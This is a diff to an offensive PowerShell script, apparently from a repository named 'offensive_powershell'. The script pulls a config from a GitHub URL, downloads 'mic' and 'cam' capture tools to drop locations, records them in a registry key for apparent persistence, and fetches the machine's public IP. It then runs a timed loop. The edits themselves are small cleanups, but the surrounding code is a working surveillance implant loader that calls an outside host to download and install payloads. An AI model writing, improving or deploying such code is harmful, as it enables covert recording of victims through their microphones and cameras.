@@ -12,7 +12,7 @@ if(-not(Test-Path -Path $BaseDir -PathType Container)) {
 
 function Get-Config{
     try{
-        return (iwr -uri https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/config.json -UseBasicParsing).Content | ConvertFrom-Json
+        return (iwr -uri https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/config.json).Content | ConvertFrom-Json
     }catch{ return $null }
 }
 
@@ -49,7 +49,7 @@ function Deploy-Tool {
     try {
         iwr -Uri $toolConfig.url -OutFile $finalPath -UseBasicParsing
         if(-not (Test-Path -Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
-        Set-ItemProperty -Path $regPath -Name $valName -Value $finalPath -Type String -Force # TODO: Set Out-Null
+        Set-ItemProperty -Path $regPath -Name $valName -Value $finalPath -Type String -Force | Out-Null 
         return $finalPath
     } catch {}
     return $null
@@ -63,7 +63,7 @@ $mic_path = Deploy-Tool -toolConfig $config.mic -dropPaths $dropPaths
 $cam_path = Deploy-Tool -toolConfig $config.cam -dropPaths $dropPaths
 
 try {
-    $ip = (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 3 -ErrorAction SilentlyContinue)
+    $ip = (irm -Uri "https://ifconfig.me/ip" -TimeoutSec 3 -ErrorAction SilentlyContinue)
 } catch { }
 
 while ($true) {
@@ -101,7 +101,7 @@ while ($true) {
     }
 
     if (-not ($dropPaths -is [array] -and $null -ne $dropPaths -and $dropPaths.Count -gt 0)){
-        $dropPaths = Get-Paths
+        $dropPaths = Get-Paths -dropPaths $config.safe_dirs
     }
 
     if( $Counter % 12 -eq 0 -or $instant ) { # either mod with 12(3 min interval) or 20 (5 minute interval)
